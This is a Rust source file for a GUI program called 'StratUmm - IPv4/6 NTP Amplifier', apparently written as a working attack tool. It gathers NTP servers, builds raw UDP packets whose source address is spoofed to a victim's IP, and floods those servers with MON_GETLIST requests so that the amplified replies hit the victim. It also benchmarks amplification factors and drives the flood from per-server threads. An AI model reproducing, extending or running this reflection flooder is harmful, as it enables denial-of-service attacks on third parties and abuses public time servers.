// Author: dotslashCosmic

use colored::Color;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{Ipv4Flags, MutableIpv4Packet};
use pnet::packet::ipv6::MutableIpv6Packet;
use pnet::packet::udp::MutableUdpPacket;
use pnet::packet::MutablePacket;
use pnet::transport::{transport_channel, TransportChannelType};
use serde::{Deserialize, Serialize};
use std::fs;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, ToSocketAddrs};
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::time::{Duration, Instant};
use std::sync::atomic::{AtomicU64, Ordering};

use rfd;

use tokio::sync::mpsc as tokio_mpsc;
use tokio::sync::watch;

mod gui;

const CONFIG_PATH: &str = "config.json";
const DEFAULT_SERVERS_LIST_PATH: &str = "servers.txt";
const WAIT_FACTOR: u64 = 2;
const VERSION: &str = "0.1.0";

pub enum AppCommand {
    ScanServers,
    StartAttack { target_ip: String, servers: Vec<String>, duration_secs: u64 },
    StopAttack,
    BrowseServerList,
    BrowseConfig,
    BenchmarkServer { server_ip: String, spoofed_source_ip: String },
}

pub struct AttackStats {
    pub packets_sent: u64,
    pub duration_secs: u64,
    pub active_servers: usize,
    pub total_servers: usize,
}

pub struct BenchmarkResult {
    pub server_ip: String,
    pub bytes_received: u64,
    pub amplification_factor: f64,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct Config {
    pub ntp_config_path: String,
    pub pools: Vec<String>,
}

impl Config {
    pub fn from_json_file(json_file: &str) -> anyhow::Result<Self> {
        let data = fs::read_to_string(json_file)?;
        let config: Self = serde_json::from_str(&data)?;
        // update_pools might not be needed here if scanner does it, or if managed explicitly
        // config.update_pools()?; 
        Ok(config)
    }

    pub fn _remove_pools(&self) -> anyhow::Result<()> {
        let lines: Vec<String> = fs::read_to_string(&self.ntp_config_path)?
            .lines()
            .filter(|line| !line.trim_start().starts_with("server"))
            .map(String::from)
            .collect();
        fs::write(&self.ntp_config_path, lines.join("\n") + "\n")?;
        Ok(())
    }

    pub fn update_pools(&mut self) -> anyhow::Result<()> {
        print_formatted_to_channel(
            gui::log_sender().clone(),
            "+",
            &format!("Updating NTP pools in config: {}", self.ntp_config_path),
            Color::Green,
        );
        let mut lines: Vec<String> = match fs::read_to_string(&self.ntp_config_path) {
            Ok(content) => content.lines()
                                .filter(|line| !line.trim_start().starts_with("server "))
                                .map(String::from)
                                .collect(),
            Err(_) => Vec::new(),
        };

        for pool in &self.pools {
            lines.push(format!("server {}", pool));
        }
        fs::write(&self.ntp_config_path, lines.join("\n") + "\n")?;
        Ok(())
    }
}

fn create_default_config_if_missing() -> anyhow::Result<()> {
    if !fs::metadata(CONFIG_PATH).is_ok() {
        print_formatted_to_channel(gui::log_sender().clone(), "+", &format!("{} not found. Creating default config file.", CONFIG_PATH), Color::Yellow);
        let default_config_content = r#"{
    "ntp_config_path": "/etc/ntp.conf",
    "pools": [
        "asia.pool.ntp.org",
        "europe.pool.ntp.org",
        "north-america.pool.ntp.org",
        "south-america.pool.ntp.org",
        "oceana.pool.ntp.org",
        "africa.pool.ntp.org",
        "ntp.ubuntu.com"
    ]
}"#;
        fs::write(CONFIG_PATH, default_config_content)?;
        print_formatted_to_channel(gui::log_sender().clone(), "+", &format!("Default {} created successfully.", CONFIG_PATH), Color::Green);
    }
    Ok(())
}

fn create_default_servers_list_if_missing() -> anyhow::Result<()> {
    if !fs::metadata(DEFAULT_SERVERS_LIST_PATH).is_ok() {
        print_formatted_to_channel(gui::log_sender().clone(), "+", &format!("{} not found. Creating default server list file.", DEFAULT_SERVERS_LIST_PATH), Color::Yellow);
        let default_servers_content = r#"time.google.com
time1.google.com
time2.google.com
time3.google.com
time4.google.com
"#;
        fs::write(DEFAULT_SERVERS_LIST_PATH, default_servers_content)?;
        print_formatted_to_channel(gui::log_sender().clone(), "+", &format!("Default {} created successfully.", DEFAULT_SERVERS_LIST_PATH), Color::Green);
    }
    Ok(())
}


pub struct NTPScanner {
    config: Config,
    pub servers: Vec<String>,
}

impl NTPScanner {
    pub async fn new(config: Config) -> anyhow::Result<Self> {
        let mut scanner = Self {
            config,
            servers: Vec::new(),
        };
        scanner.config.update_pools()?;
        scanner.restart_daemon().await?;
        Ok(scanner)
    }

    async fn restart_daemon(&self) -> anyhow::Result<()> {
        print_formatted_to_channel(gui::log_sender().clone(), "+", "Restarting ntp daemon...", Color::Green);
        let status = tokio::task::spawn_blocking(|| {
            Command::new("sudo")
                .arg("systemctl")
                .arg("restart")
                .arg("ntp") // or ntpd/chronyd depending on system
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .status()
        }).await??;
        
        if !status.success() {
            print_formatted_to_channel(gui::log_sender().clone(), "-", "Failed to restart NTP daemon. Check permissions and if NTP is installed.", Color::Red);
        }
        print_formatted_to_channel(gui::log_sender().clone(), "+", "Synchronizing ntp servers...", Color::Green);
        tokio::time::sleep(Duration::from_secs(WAIT_FACTOR * self.config.pools.len() as u64)).await;
        Ok(())
    }

    pub async fn scan(&mut self) -> anyhow::Result<()> {
        self.servers.clear();
        print_formatted_to_channel(gui::log_sender().clone(), "+", "Scanning for ntp servers...", Color::Green);
        let output_result = tokio::task::spawn_blocking(|| {
            Command::new("ntpq")
                .arg("-p")
                .output()
        }).await?;

        match output_result {
            Ok(output) if output.status.success() => {
                let output_str = String::from_utf8_lossy(&output.stdout);
                for line in output_str.lines() {
                    if let Some(refid) = extract_ip_refid(line) {
                        self.servers.push(refid);
                    }
                }
            }
            Ok(output) => {
                 let err_msg = String::from_utf8_lossy(&output.stderr);
                 print_formatted_to_channel(gui::log_sender().clone(), "-", &format!("ntpq command failed: {}", err_msg), Color::Red);
                 anyhow::bail!("ntpq command failed: {}", err_msg);
            }
            Err(e) => {
                print_formatted_to_channel(gui::log_sender().clone(), "-", &format!("Failed to execute ntpq: {}", e), Color::Red);
                anyhow::bail!("Failed to execute ntpq: {}", e);
            }
        }
        Ok(())
    }
}

pub fn is_ipv4(address: &str) -> bool {
    address.parse::<Ipv4Addr>().is_ok()
}

pub fn is_ipv6(address: &str) -> bool {
    address.parse::<Ipv6Addr>().is_ok()
}

fn extract_ip_refid(row: &str) -> Option<String> {
    let parts: Vec<&str> = row.split_whitespace().collect();
    if parts.is_empty() { return None; }

    let remote_cleaned = parts[0].trim_start_matches(|c: char| c == '*' || c == '+' || c == '-' || c == '#');
    if is_ipv4(remote_cleaned) || is_ipv6(remote_cleaned) {
        return Some(remote_cleaned.to_string());
    }
    if parts.len() > 1 && (is_ipv4(parts[1]) || is_ipv6(parts[1])) {
        if !parts[1].starts_with('.') && !parts[1].ends_with('.') {
            return Some(parts[1].to_string());
        }
    }
    None
}


pub fn print_formatted_to_channel(sender: crossbeam_channel::Sender<(String, Color)>, prefix_char: &str, text: &str, color: Color) {
    let prefix_color = match prefix_char {
        "+" => Color::Green,
        "!" => Color::Yellow,
        "-" => Color::Red,
        _ => Color::White,
    };
    let _ = sender.send((format!("[{}] {}", prefix_char, text), color));
}


fn deny(
    server: String,
    target: String,
    packets_sent_counter: Arc<AtomicU64>,
    log_sender: crossbeam_channel::Sender<(String, Color)>,
    stop_rx: crossbeam_channel::Receiver<()>,
) -> anyhow::Result<()> {
    let payload: [u8; 8] = [0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00]; // MON_GETLIST_6 request

    let server_ip = match server.to_socket_addrs() {
        Ok(mut addrs) => {
            if let Some(addr) = addrs.next() {
                addr.ip()
            } else {
                print_formatted_to_channel(log_sender.clone(), "-", &format!("Failed to resolve server hostname: {}", server), Color::Red);
                return Err(anyhow::anyhow!("Failed to resolve server hostname: {}", server));
            }
        }
        Err(e) => {
            print_formatted_to_channel(log_sender.clone(), "-", &format!("Error resolving server hostname {}: {}", server, e), Color::Red);
            return Err(e.into());
        }
    };

    let target_ip = target.parse::<IpAddr>()?;

    let (mut tx, _rx) = match transport_channel(
        4096, // Buffer size
        TransportChannelType::Layer3(IpNextHeaderProtocols::Udp),
    ) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => {
            print_formatted_to_channel(log_sender.clone(), "-", &format!("Failed to create raw socket: {}. Try running with sudo/administrator.", e), Color::Red);
            return Err(e.into());
        }
    };


    let mut ipv4_buffer: Vec<u8> = vec![0; 20 + 8 + payload.len()];
    let mut ipv6_buffer: Vec<u8> = vec![0; 40 + 8 + payload.len()];

    loop {
        if stop_rx.try_recv().is_ok() {
            break;
        }

        match (server_ip, target_ip) {
            (IpAddr::V6(s_ipv6), IpAddr::V6(t_ipv6)) => {
                let mut ip_packet = MutableIpv6Packet::new(&mut ipv6_buffer).ok_or_else(|| anyhow::anyhow!("Failed to create IPv6 packet buffer"))?;
                ip_packet.set_version(6);
                ip_packet.set_traffic_class(0);
                ip_packet.set_flow_label(0);
                ip_packet.set_payload_length((8 + payload.len()) as u16);
                ip_packet.set_next_header(IpNextHeaderProtocols::Udp);
                ip_packet.set_hop_limit(64);
                ip_packet.set_source(t_ipv6); // Source is spoofed target
                ip_packet.set_destination(s_ipv6); // Destination is NTP server

                let mut udp_packet = MutableUdpPacket::new(ip_packet.payload_mut()).ok_or_else(|| anyhow::anyhow!("Failed to create UDP packet buffer (IPv6)"))?;
                udp_packet.set_source(12345); // Spoofed source port
                udp_packet.set_destination(123); // NTP port
                udp_packet.set_length((8 + payload.len()) as u16);
                udp_packet.set_payload(&payload);
                udp_packet.set_checksum(pnet::packet::udp::ipv6_checksum(&udp_packet.to_immutable(), &t_ipv6, &s_ipv6));

                if let Err(e) = tx.send_to(ip_packet.to_immutable(), server_ip) {
                     print_formatted_to_channel(log_sender.clone(), "-", &format!("IPv6 send error to {}: {}", server, e), Color::Red);
                }
            }
            (IpAddr::V4(s_ipv4), IpAddr::V4(t_ipv4)) => {
                let mut ip_packet = MutableIpv4Packet::new(&mut ipv4_buffer).ok_or_else(|| anyhow::anyhow!("Failed to create IPv4 packet buffer"))?;
                ip_packet.set_version(4);
                ip_packet.set_header_length(5);
                ip_packet.set_total_length((20 + 8 + payload.len()) as u16);
                ip_packet.set_identification(rand::random::<u16>()); // Random ID
                ip_packet.set_flags(Ipv4Flags::DontFragment);
                ip_packet.set_ttl(64);
                ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
                ip_packet.set_source(t_ipv4); // Source is spoofed target
                ip_packet.set_destination(s_ipv4); // Destination is NTP server
                ip_packet.set_checksum(pnet::packet::ipv4::checksum(&ip_packet.to_immutable()));


                let mut udp_packet = MutableUdpPacket::new(ip_packet.payload_mut()).ok_or_else(|| anyhow::anyhow!("Failed to create UDP packet buffer (IPv4)"))?;
                udp_packet.set_source(12345); // Spoofed source port
                udp_packet.set_destination(123); // NTP port
                udp_packet.set_length((8 + payload.len()) as u16);
                udp_packet.set_payload(&payload);
                udp_packet.set_checksum(pnet::packet::udp::ipv4_checksum(&udp_packet.to_immutable(), &t_ipv4, &s_ipv4));

                if let Err(e) = tx.send_to(ip_packet.to_immutable(), server_ip) {
                    print_formatted_to_channel(log_sender.clone(), "-", &format!("IPv4 send error to {}: {}", server, e), Color::Red);
                }
            }
            (IpAddr::V6(s_ipv6), IpAddr::V4(t_ipv4)) => {
                print_formatted_to_channel(
                    log_sender.clone(),
                    "!",
                    &format!(
                        "Skipping: Cannot target IPv6 server {:?} with IPv4 spoofed source {}. IP versions must match.",
                        s_ipv6, t_ipv4
                    ),
                    Color::Yellow,
                );
                return Ok(());
            }
            (IpAddr::V4(s_ipv4), IpAddr::V6(t_ipv6)) => {
                print_formatted_to_channel(
                    log_sender.clone(),
                    "!",
                    &format!(
                        "Skipping: Cannot target IPv4 server {:?} with IPv6 spoofed source {}. IP versions must match.",
                        s_ipv4, t_ipv6
                    ),
                    Color::Yellow,
                );
                return Ok(());
            }
        }
        packets_sent_counter.fetch_add(1, Ordering::SeqCst);
    }
    Ok(())
}

async fn benchmark_server(
    server_ip_str: String,
    spoofed_source_ip_str: String,
    log_sender: crossbeam_channel::Sender<(String, Color)>,
    benchmark_result_sender: tokio_mpsc::UnboundedSender<BenchmarkResult>,
) -> anyhow::Result<()> {
    print_formatted_to_channel(log_sender.clone(), "+", &format!("Benchmarking server: {} with test target: {}", server_ip_str, spoofed_source_ip_str), Color::Green);

    let payload: [u8; 8] = [0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00];
    let request_size_ip_header = match spoofed_source_ip_str.parse::<IpAddr>()? {
        IpAddr::V4(_) => 20,
        IpAddr::V6(_) => 40,
    };
    let request_size = (request_size_ip_header + 8 + payload.len()) as f64;
// TODO Resolve to IP if url before parsing
    let server_ip = server_ip_str.parse::<IpAddr>()?;
    let spoofed_source_ip = spoofed_source_ip_str.parse::<IpAddr>()?; //spoofed source

    // TODO spoofed_source_ip should be an IP you control and can listen on
    // If spoofed_source_ip is "localhost" or a local IP, bind to UDP socket

    let listen_addr_str = match spoofed_source_ip {
        IpAddr::V4(_) => format!("{}:0", spoofed_source_ip),
        IpAddr::V6(_) => format!("[{}]:0", spoofed_source_ip),
    };
    
    let listener_socket = match tokio::net::UdpSocket::bind(&listen_addr_str).await {
        Ok(s) => s,
        Err(e) => {
            print_formatted_to_channel(log_sender.clone(), "-", &format!("Failed to bind UDP socket for benchmark on {}: {}. Ensure IP is local or routable.", listen_addr_str, e), Color::Red);
             let _ = benchmark_result_sender.send(BenchmarkResult {
                server_ip: server_ip_str,
                bytes_received: 0,
                amplification_factor: 0.0,
            });
            return Err(e.into());
        }
    };
    let local_port = listener_socket.local_addr()?.port();
    print_formatted_to_channel(log_sender.clone(), "+", &format!("Listening for benchmark response on {}:{}", spoofed_source_ip, local_port), Color::Green);


    let (mut raw_tx, _raw_rx) = match transport_channel(
        4096,
        TransportChannelType::Layer3(IpNextHeaderProtocols::Udp),
    ) {
         Ok((tx, rx)) => (tx, rx),
         Err(e) => {
            print_formatted_to_channel(log_sender.clone(), "-", &format!("Failed to create raw socket for benchmark: {}. Try running with sudo/administrator.", e), Color::Red);
            let _ = benchmark_result_sender.send(BenchmarkResult {
                server_ip: server_ip_str.clone(),
                bytes_received: 0,
                amplification_factor: 0.0,
            });
            return Err(e.into());
        }
    };


    match (server_ip, spoofed_source_ip) {
        (IpAddr::V6(s_ipv6), IpAddr::V6(t_ipv6)) => {
            let mut vec: Vec<u8> = vec![0; 40 + 8 + payload.len()];
            let mut ip_packet = MutableIpv6Packet::new(&mut vec).ok_or_else(|| anyhow::anyhow!("Failed to create IPv6 packet buffer"))?;
            ip_packet.set_version(6);
            ip_packet.set_payload_length((8 + payload.len()) as u16);
            ip_packet.set_next_header(IpNextHeaderProtocols::Udp);
            ip_packet.set_hop_limit(64);
            ip_packet.set_source(t_ipv6); // Spoofed source
            ip_packet.set_destination(s_ipv6);

            let mut udp_packet = MutableUdpPacket::new(ip_packet.payload_mut()).ok_or_else(|| anyhow::anyhow!("Failed to create UDP packet buffer (IPv6)"))?;
            udp_packet.set_source(local_port); // Source port
            udp_packet.set_destination(123); // NTP port
            udp_packet.set_length((8 + payload.len()) as u16);
            udp_packet.set_payload(&payload);
            udp_packet.set_checksum(pnet::packet::udp::ipv6_checksum(&udp_packet.to_immutable(), &t_ipv6, &s_ipv6));

            raw_tx.send_to(ip_packet.to_immutable(), server_ip)?;
        }
        (IpAddr::V4(s_ipv4), IpAddr::V4(t_ipv4)) => {
            let mut vec: Vec<u8> = vec![0; 20 + 8 + payload.len()];
            let mut ip_packet = MutableIpv4Packet::new(&mut vec).ok_or_else(|| anyhow::anyhow!("Failed to create IPv4 packet buffer"))?;
            ip_packet.set_version(4);
            ip_packet.set_header_length(5);
            ip_packet.set_total_length((20 + 8 + payload.len()) as u16);
            ip_packet.set_ttl(64);
            ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
            ip_packet.set_source(t_ipv4); // Spoofed source
            ip_packet.set_destination(s_ipv4);
            ip_packet.set_flags(Ipv4Flags::DontFragment);
            ip_packet.set_checksum(pnet::packet::ipv4::checksum(&ip_packet.to_immutable()));

            let mut udp_packet = MutableUdpPacket::new(ip_packet.payload_mut()).ok_or_else(|| anyhow::anyhow!("Failed to create UDP packet buffer (IPv4)"))?;
            udp_packet.set_source(local_port); // Source port
            udp_packet.set_destination(123); // NTP port
            udp_packet.set_length((8 + payload.len()) as u16);
            udp_packet.set_payload(&payload);
            udp_packet.set_checksum(pnet::packet::udp::ipv4_checksum(&udp_packet.to_immutable(), &t_ipv4, &s_ipv4));

            raw_tx.send_to(ip_packet.to_immutable(), server_ip)?;
        }
        _ => {
            print_formatted_to_channel(log_sender.clone(), "-", &format!("Warning: Cannot benchmark {} with target {}. IP version mismatch.", server_ip_str, spoofed_source_ip_str), Color::Yellow);
            let _ = benchmark_result_sender.send(BenchmarkResult {
                server_ip: server_ip_str,
                bytes_received: 0,
                amplification_factor: 0.0,
            });
            return Ok(());
        }
    }

    let mut total_response_size = 0;
    let receive_timeout = Duration::from_secs(5); // Increased timeout
    let mut buf = [0; 65535]; // Max UDP packet size

    match tokio::time::timeout(receive_timeout, listener_socket.recv_from(&mut buf)).await {
        Ok(Ok((size, src_addr))) => {
            if src_addr.ip() == server_ip {
                total_response_size += size;
                print_formatted_to_channel(log_sender.clone(), "+", &format!("Received {} bytes from {}", size, src_addr), Color::Green);
            } else {
                print_formatted_to_channel(log_sender.clone(), "!", &format!("Received packet from unexpected source {} (expected {})", src_addr.ip(), server_ip), Color::Yellow);
            }
        }
        Ok(Err(e)) => {
            print_formatted_to_channel(log_sender.clone(), "-", &format!("Error receiving benchmark response: {}", e), Color::Red);
        }
        Err(_) => {
            print_formatted_to_channel(log_sender.clone(), "!", &format!("Timeout waiting for benchmark response from {}", server_ip_str), Color::Yellow);
        }
    }


    let amplification_factor = if request_size > 0.0 && total_response_size > 0 {
        total_response_size as f64 / request_size
    } else {
        0.0
    };

    print_formatted_to_channel(log_sender.clone(), "+", &format!("Benchmark result for {}: {} bytes received (Amplification: {:.2}x).", server_ip_str, total_response_size, amplification_factor), Color::Green);
    let _ = benchmark_result_sender.send(BenchmarkResult {
        server_ip: server_ip_str,
        bytes_received: total_response_size as u64,
        amplification_factor,
    });

    Ok(())
}

pub async fn ntp_amplify(
    servers: Vec<String>,
    target: String,
    log_sender: crossbeam_channel::Sender<(String, Color)>,
    stats_sender: tokio_mpsc::UnboundedSender<AttackStats>,
    global_stop_rx: crossbeam_channel::Receiver<()>,
    duration_limit_secs: u64,
) -> anyhow::Result<()> {
    print_formatted_to_channel(
        log_sender.clone(),
        "+",
        &format!("Starting to flood: {} ...", target),
        Color::Green,
    );
    print_formatted_to_channel(log_sender.clone(), "+", "Flooding...", Color::Green);

    let target_arc = Arc::new(target);
    let packets_sent_counter = Arc::new(AtomicU64::new(0));
    let attack_start_time = Instant::now();

    let mut deny_stop_senders = Vec::new();
    let mut join_handles = Vec::new();

    for server in &servers {
        let (deny_stop_tx, deny_stop_rx_for_thread) = crossbeam_channel::unbounded(); // individual deny threads
        deny_stop_senders.push(deny_stop_tx);

        let server_clone = server.clone();
        let target_clone = Arc::clone(&target_arc);
        let packets_sent_counter_clone = Arc::clone(&packets_sent_counter);
        let log_sender_clone = log_sender.clone();


        let handle = tokio::task::spawn_blocking(move || {
            if let Err(e) = deny(
                server_clone,
                (*target_clone).clone(),
                packets_sent_counter_clone,
                log_sender_clone,
                deny_stop_rx_for_thread,
            ) {
                print_formatted_to_channel(gui::log_sender().clone(), "-", &format!("Error in denial thread: {}", e), Color::Red);
            }
        });
        join_handles.push(handle);
    }

    let (stats_shutdown_tx, mut stats_shutdown_rx_for_loop) = watch::channel(false);


    let stats_sender_clone = stats_sender.clone();
    let packets_sent_counter_clone_for_stats = Arc::clone(&packets_sent_counter);
    let total_servers_count = servers.len();
    let log_sender_clone_for_stats = log_sender.clone();

    tokio::spawn(async move {
        loop {
            tokio::select! {
                _ = tokio::time::sleep(Duration::from_secs(1)) => {
                    let current_packets = packets_sent_counter_clone_for_stats.load(Ordering::SeqCst);
                    let elapsed_secs = attack_start_time.elapsed().as_secs();

                    if duration_limit_secs > 0 && elapsed_secs >= duration_limit_secs {
                        print_formatted_to_channel(
                            log_sender_clone_for_stats.clone(),
                            "!",
                            &format!("Attack duration limit of {} seconds reached. Stopping attack.", duration_limit_secs),
                            Color::Yellow,
                        );
                        let _ = gui::command_sender().send(AppCommand::StopAttack);
                    }

                    if stats_sender_clone.send(AttackStats {
                        packets_sent: current_packets,
                        duration_secs: elapsed_secs,
                        active_servers: total_servers_count, // might not be accurate if threads die
                        total_servers: total_servers_count,
                    }).is_err() {
                        break;
                    }
                }
                result = stats_shutdown_rx_for_loop.changed() => {
                    if result.is_err() || *stats_shutdown_rx_for_loop.borrow() {
                        break;
                    }
                }
            }
        }
    });

    tokio::task::spawn_blocking(move || {
        let _ = global_stop_rx.recv();
        let _ = stats_shutdown_tx.send(true);
        for sender in deny_stop_senders {
            let _ = sender.send(());
        }
    }).await?;


    for handle in join_handles {
        let _ = handle.await;
    }

    tokio::time::sleep(Duration::from_millis(100)).await;

    print_formatted_to_channel(log_sender.clone(), "-", "Attack stopped.", Color::Red);

    Ok(())
}

pub fn read_servers(server_list_path: &str) -> anyhow::Result<Vec<String>> {
    if !fs::metadata(server_list_path).is_ok() {
        anyhow::bail!("Error: server list file '{}' does not exist", server_list_path);
    }
    let content = fs::read_to_string(server_list_path)?;
    Ok(content.lines().filter(|s| !s.trim().is_empty() && !s.trim().starts_with('#')).map(String::from).collect())
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let (log_tx_gui, log_rx_gui) = crossbeam_channel::unbounded();
    let (command_tx, mut command_rx) = tokio_mpsc::unbounded_channel();
    let (stats_tx, stats_rx) = tokio_mpsc::unbounded_channel();
    let (benchmark_result_tx, benchmark_result_rx) = tokio_mpsc::unbounded_channel();
    let (scanned_servers_tx, scanned_servers_rx) = tokio_mpsc::unbounded_channel();
    let (server_list_path_tx, mut server_list_path_rx_main) = tokio_mpsc::unbounded_channel();
    let (config_path_tx, mut config_path_rx_main) = tokio_mpsc::unbounded_channel();


    gui::init_channels(
        log_tx_gui.clone(),
        command_tx.clone(),
        stats_tx.clone(),
        scanned_servers_tx.clone(),
        server_list_path_tx.clone(),
        config_path_tx.clone(),
        benchmark_result_tx.clone(),
    );

    create_default_config_if_missing()?;
    create_default_servers_list_if_missing()?;

    tokio::spawn(async move {
        let mut current_attack_stop_tx: Option<crossbeam_channel::Sender<()>> = None;

        loop {
            tokio::select! {
                Some(cmd) = command_rx.recv() => {
                    match cmd {
                        AppCommand::ScanServers => {
                            print_formatted_to_channel(log_tx_gui.clone(), "+", "Starting server scan...", Color::Green);
                            let config_path_str = gui::get_config_path();
                            match Config::from_json_file(&config_path_str) {
                                Ok(config) => {
                                    match NTPScanner::new(config).await {
                                        Ok(mut scanner) => {
                                            if let Err(e) = scanner.scan().await {
                                                print_formatted_to_channel(log_tx_gui.clone(), "-", &format!("Scanner error: {}", e), Color::Red);
                                            } else {
                                                print_formatted_to_channel(log_tx_gui.clone(), "+", &format!("Found {} NTP servers.", scanner.servers.len()), Color::Green);
                                                if scanned_servers_tx.send(scanner.servers.clone()).is_err(){
                                                    eprintln!("Failed to send scanned servers to GUI");
                                                }
                                                // current_scanner = Some(scanner);
                                            }
                                        }
                                        Err(e) => print_formatted_to_channel(log_tx_gui.clone(), "-", &format!("NTPScanner creation error: {}", e), Color::Red),
                                    }
                                }
                                Err(e) => print_formatted_to_channel(log_tx_gui.clone(), "-", &format!("Failed to load config '{}': {}", config_path_str, e), Color::Red),
                            }
                        }
                        AppCommand::StartAttack { target_ip, servers, duration_secs } => {
                            if let Some(stop_tx) = current_attack_stop_tx.take() { // take to ensure old one is gone
                                let _ = stop_tx.send(()); // Stop previous attack
                            }

                            let (attack_stop_tx, attack_stop_rx_for_thread) = crossbeam_channel::unbounded();
                            current_attack_stop_tx = Some(attack_stop_tx);

                            let log_sender_clone = log_tx_gui.clone();
                            let stats_sender_clone = stats_tx.clone();
                            tokio::spawn(async move {
                                if let Err(e) = ntp_amplify(servers, target_ip, log_sender_clone, stats_sender_clone, attack_stop_rx_for_thread, duration_secs).await {
                                    print_formatted_to_channel(gui::log_sender().clone(), "-", &format!("Attack process error: {}", e), Color::Red);
                                }
                            });
                        }
                        AppCommand::StopAttack => {
                            if let Some(stop_tx) = current_attack_stop_tx.take() {
                                let _ = stop_tx.send(());
                                print_formatted_to_channel(log_tx_gui.clone(), "-", "Attack stop signal sent.", Color::Red);
                            } else {
                                print_formatted_to_channel(log_tx_gui.clone(), "!", "No active attack to stop.", Color::Yellow);
                            }
                        }
                        AppCommand::BrowseServerList => {
                            if let Some(path) = rfd::FileDialog::new()
                                .set_title("Select Server List File")
                                .add_filter("Text files", &["txt"])
                                .pick_file()
                                .map(|p| p.to_string_lossy().into_owned()) {
                                if server_list_path_tx.send(path).is_err(){
                                     eprintln!("Failed to send server list path to GUI handler");
                                }
                            }
                        }
                        AppCommand::BrowseConfig => {
                            if let Some(path) = rfd::FileDialog::new()
                                .set_title("Select Config File")
                                .add_filter("JSON files", &["json"])
                                .pick_file()
                                .map(|p| p.to_string_lossy().into_owned()) {
                                if config_path_tx.send(path).is_err(){
                                    eprintln!("Failed to send config path to GUI handler");
                                }
                            }
                        }
                        AppCommand::BenchmarkServer { server_ip, spoofed_source_ip } => {
                            let log_sender_clone = log_tx_gui.clone();
                            let benchmark_result_sender_clone = benchmark_result_tx.clone();
                            tokio::spawn(async move {
                                if let Err(e) = benchmark_server(server_ip, spoofed_source_ip, log_sender_clone, benchmark_result_sender_clone).await {
                                    print_formatted_to_channel(gui::log_sender().clone(), "-", &format!("Benchmark error: {}", e), Color::Red);
                                }
                            });
                        }
                    }
                },
                Some(path) = server_list_path_rx_main.recv() => {
                    print_formatted_to_channel(log_tx_gui.clone(), "+", &format!("Main logic received server list path update: {}", path), Color::Green);
                },
                Some(path) = config_path_rx_main.recv() => {
                    print_formatted_to_channel(log_tx_gui.clone(), "+", &format!("Main logic received config path update: {}", path), Color::Green);
                },
                else => {
                    break;
                }
            }
        }
    });

    let native_options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size([1000.0, 700.0])
            .with_min_inner_size([800.0, 600.0]),
        ..Default::default()
    };

    eframe::run_native(
        "StratUmm - IPv4/6 NTP Amplifier",
        native_options,
        Box::new(move |cc| Box::new(gui::NTPAmplifierApp::new(
            cc,
            log_rx_gui,
            stats_rx,
            scanned_servers_rx,
            tokio_mpsc::unbounded_channel().1, // Dummy rx, GUI uses its own for paths now
            tokio_mpsc::unbounded_channel().1,
            benchmark_result_rx
        ))),
    ).map_err(|e| anyhow::anyhow!("Eframe error: {}", e))?;

    Ok(())
}
